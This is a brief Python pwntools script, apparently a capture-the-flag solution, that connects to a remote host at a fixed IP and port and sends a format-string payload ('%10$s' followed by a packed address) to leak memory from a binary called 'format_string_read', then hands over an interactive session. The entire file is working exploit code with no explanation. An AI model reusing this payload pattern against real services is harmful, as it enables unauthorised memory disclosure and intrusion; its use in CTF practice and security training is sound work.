import pwn

#p = pwn.gdb.debug("./format_string_read")
#p = pwn.process("./format_string_read")
p = pwn.remote("34.71.207.70",5337)
p.sendafter("name",b"AAAABBBB%10$sAAA\xa0\x40\x40")
p.interactive()
